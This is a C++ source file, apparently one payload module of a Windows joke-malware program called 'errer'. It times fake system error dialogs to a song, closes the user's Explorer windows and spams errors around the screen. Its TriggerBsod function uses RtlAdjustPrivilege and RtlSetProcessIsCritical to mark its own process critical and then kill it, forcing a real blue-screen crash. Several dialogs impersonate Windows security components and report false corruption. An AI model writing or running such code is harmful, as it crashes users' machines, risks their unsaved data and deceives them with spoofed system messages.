#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <wchar.h>
#include <commctrl.h>
#include <math.h>
#include "../SongSync.h"
#include "../Wobble.h"
#include "../Flags.h"
#include "../CrashLog.h"
#include "../Toast.h"

#pragma comment(lib, "comctl32.lib")
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

extern void RestoreTitles();
extern void createError(const wchar_t* title, const wchar_t* text);
extern void SetErrorIcon(const wchar_t* type);
extern void PositionErrorTo(const wchar_t* pos);
extern void PositionErrorToAbsolute(int x, int y);
bool IsChildMode();

static const int P7_DELAYS[109] = {
    224,   200,   209,   207,   456,
    201,   200,   233,   224,   216,
    216,   440,   216,   225,   216,
    216,   216,   207,   441,   224,
    216,   224,   216,   225,   216,
    432,   216,   231,   208,   200,
    240,   200,   441,   209,   215,
    225,   216,   216,   224,   423,
    216,   233,   200,   233,   224,
    233,   416,   216,   233,   209,
    224,   224,   216,   417,   216,
    224,   233,   207,   201,   224,
    425,   232,   207,   225,   200,
    216,   224,   425,   224,   232,
    224,   209,   207,   233,   432,
    216,   224,   225,   231,   209,
    224,   408,   233,   216,   209,
    231,   217,   224,   408,   240,
    208,   224,   216,   224,   192,
    441,   200,   240,   208,   216,
    233,   207,   473,   200,   233,
    207,   217,   200,   224
};

static const wchar_t* P7_TITLES[] = {
    L"Microsoft Windows",
    L"System Error",
    L"errer.exe - Application Error",
    L"Windows Host Process (Rundll32)",
    L"Local Security Authority Process",
    L"Runtime Error!",
    L"Windows Security",
    L"Windows Explorer",
    L"Critical Error",
    L"Driver Error",
    L"Registry Editor",
    L"DLL Host",
    L"Setup",
    L"File System Error",
    L"Problem Event Name",
};
static const int P7_TITLE_COUNT = (int)(sizeof(P7_TITLES) / sizeof(P7_TITLES[0]));

static const wchar_t* P7_BODIES[] = {
    L"The instruction at 0x0000000140001A25 referenced memory at 0x0000000000000000. The memory could not be read.",
    L"The application failed to initialize properly (0xc0000005). Click on OK to terminate the application.",
    L"The system cannot find the file specified.",
    L"Windows could not search for new updates. The page you are looking for is currently unavailable.",
    L"A required DLL file could not be found.",
    L"The parameter is incorrect.",
    L"Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.",
    L"A device attached to the system is not functioning.",
    L"The exception unknown software exception (0xc0000417) occurred in the application at location 0x0000000140001A25.",
    L"The system hive has been corrupted. A persistent problem was detected in the registry.",
    L"Not enough storage is available to process this command.",
    L"The process cannot access the file because it is being used by another process.",
    L"The file or directory is corrupted and unreadable.",
    L"The system has rebooted without cleanly shutting down first. This error could be caused if the system stopped responding, crashed, or lost power unexpectedly.",
    L"Windows does not have a valid license. Activation state: notification only.",
};
static const int P7_BODY_COUNT = (int)(sizeof(P7_BODIES) / sizeof(P7_BODIES[0]));

static const wchar_t* P7_ICONS[] = {
    L"error", L"warning", L"error", L"error", L"warning", L"error"
};
static const int P7_ICON_COUNT = (int)(sizeof(P7_ICONS) / sizeof(P7_ICONS[0]));

static const DWORD P7_TOAST_DELAYS[] = {
    1752,  1752,  1712,  1705,  1735,
    1768,  1769,  1695,  1720,  1753,
    1760,  1762,  1751,  1713,  1695,
    1721
};

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pfnRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);

static void TriggerBsod() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) ntdll = LoadLibraryW(L"ntdll.dll");
    if (!ntdll) return;

    pfnRtlAdjustPrivilege RtlAdjustPrivilege =
        (pfnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    pfnRtlSetProcessIsCritical RtlSetProcessIsCritical =
        (pfnRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (!RtlAdjustPrivilege || !RtlSetProcessIsCritical) return;

    BOOLEAN old = FALSE;
    RtlAdjustPrivilege(20, TRUE, FALSE, &old);
    RtlSetProcessIsCritical(TRUE, NULL, FALSE);
    TerminateProcess(GetCurrentProcess(), (UINT)STATUS_INTEGER_DIVIDE_BY_ZERO);
}

static BOOL CALLBACK ClearProc(HWND hwnd, LPARAM lp) {
    (void)lp;
    wchar_t cls[64];
    if (!GetClassNameW(hwnd, cls, 64)) return TRUE;

    if (_wcsicmp(cls, L"#32770") == 0) {
        SendMessageW(hwnd, TDM_CLICK_BUTTON, IDOK, 0);
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return TRUE;
    }
    if (_wcsicmp(cls, L"errerFakeExplorer") == 0) {
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return TRUE;
    }
    if (_wcsicmp(cls, L"CabinetWClass") == 0) {
        PostMessageW(hwnd, WM_CLOSE, 0, 0);
        return TRUE;
    }
    return TRUE;
}

static bool NoBsod() {
    return NoBsodFlag();
}

extern void LaunchPayload8();

// Mirror of payload 8's frame count, so payload 7 can stay alive until the
// whole wallpaper sequence has played. Keep in step with payload8.cpp.
#define P8_FRAME_COUNT 272
#define P8_FPS 30
#define P8_SONG_MS 210315

// Set by payload 8 once the wallpaper ending is finished and the original
// wallpaper has been restored.
#define P8_DONE_EVENT L"Local\\errer_p8_done"

void runPayload7() {
    if (SongSyncWaitHostFlag()) SongSyncWaitHost();

    bool anchored = false;
    DWORD base = SongSyncBase(182546, &anchored);
    SongSyncWait(base);

    RestoreTitles();
    EnumWindows(ClearProc, 0);

    if (!NoGdiFlag() && !IsChildMode()) {
        DWORD* wobMs = new DWORD(26972);
        HANDLE hWobble = CreateThread(NULL, 0, WobbleAmbientProc, wobMs, 0, NULL);
        if (hWobble) CloseHandle(hWobble);
    }

    srand((unsigned)GetTickCount() ^ 0x7B47);

    StartToastTimeline(P7_TOAST_DELAYS,
                       (int)(sizeof(P7_TOAST_DELAYS) / sizeof(P7_TOAST_DELAYS[0])));

    const int beatCount = (int)(sizeof(P7_DELAYS) / sizeof(P7_DELAYS[0]));
    bool haveClock = SongSyncAvailable();
    DWORD acc = 0;
    for (int i = 0; i < beatCount; i++) {
        if (haveClock) {
            SongSyncWaitBeat(182546 + acc);
        } else if (base) {
            DWORD target = base + acc;
            while ((LONG)(GetTickCount() - target) < 0) Sleep(5);
        } else if (i > 0) {
            Sleep((DWORD)P7_DELAYS[i - 1]);
        }

        SetErrorIcon(P7_ICONS[i % P7_ICON_COUNT]);
        PositionErrorTo(L"cascade");
        createError(P7_TITLES[i % P7_TITLE_COUNT], P7_BODIES[i % P7_BODY_COUNT]);
        if (!NoGdiFlag()) WobbleRetintNow();
        if (i + 1 < beatCount) acc += (DWORD)P7_DELAYS[i];
    }

    // Rapid-fire error spam in a full circle before the BSOD: 35 ms delay
    // between errors, positions distributed evenly around a circle that fills
    // most of the screen. Runs for 3 seconds total. Only runs when not
    // --nobsod (no point spamming if we're just going to exit cleanly).
    if (!NoBsodFlag() && !IsChildMode()) {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        const int circleDelayMs = 35;
        const int circleTotalMs = 3000;
        const int circleCount = circleTotalMs / circleDelayMs;
        double cx = (double)sw / 2.0;
        double cy = (double)sh / 2.0;
        double radius = (double)(sw < sh ? sw : sh) * 0.45;

        DWORD circleStart = GetTickCount();
        for (int i = 0; i < circleCount; i++) {
            double angle = (double)i * 2.0 * 3.141592653589793 / (double)circleCount;
            int x = (int)(cx + radius * cos(angle)) - 160;
            int y = (int)(cy + radius * sin(angle)) - 75;
            if (x < 0) x = 0;
            if (y < 0) y = 0;
            if (x > sw - 320) x = sw - 320;
            if (y > sh - 150) y = sh - 150;

            SetErrorIcon(L"error");
            PositionErrorToAbsolute(x, y);
            createError(P7_TITLES[rand() % P7_TITLE_COUNT], P7_BODIES[rand() % P7_BODY_COUNT]);
            Sleep(circleDelayMs);
        }
    }

    // Payload 8 owns the ending from here: it plays the wallpaper frames and then
    // crashes the box.
    // Payload 8 owns the wallpaper ending even in --nobsod test runs. The
    // child checks NoBsodFlag() before enabling critical-process behavior.
    //
    // The completion event is created BEFORE payload 8 is launched, so it
    // already exists when payload 8 opens it. Otherwise payload 8 could set
    // and close it before payload 7 ever opened it, and the signal would be
    // lost with the object destroyed.
    HANDLE p8Done = CreateEventW(NULL, TRUE, FALSE, P8_DONE_EVENT);

    LaunchPayload8();
    if (NoBsod()) DismissToast();

    // No error spam. It used to blanket the screen from here on and buried the
    // wallpaper ending completely; payload 7's beat-timed errors above finish
    // on their own, and the desktop is left clear for the animation.

    // Wait for the wallpaper ending to finish. It restores the original
    // wallpaper and then either crashes the box or exits cleanly (--nobsod).
    //
    // The song clock cannot be used for this: it freezes at the end of the
    // track, so a "wait until song position X" test would never be satisfied
    // and the show would hang for the full timeout. The ending signals
    // completion directly instead.
    if (p8Done) {
        WaitForSingleObject(p8Done, 30000);
        CloseHandle(p8Done);
    } else {
        // Should not happen, but if the event could not be created the show
        // must not end early - fall back to a bounded wall-clock wait.
        Sleep(15000);
    }

    ToastShutdown();
    CrashLog("end");
    TerminateProcess(GetCurrentProcess(), 0);
}
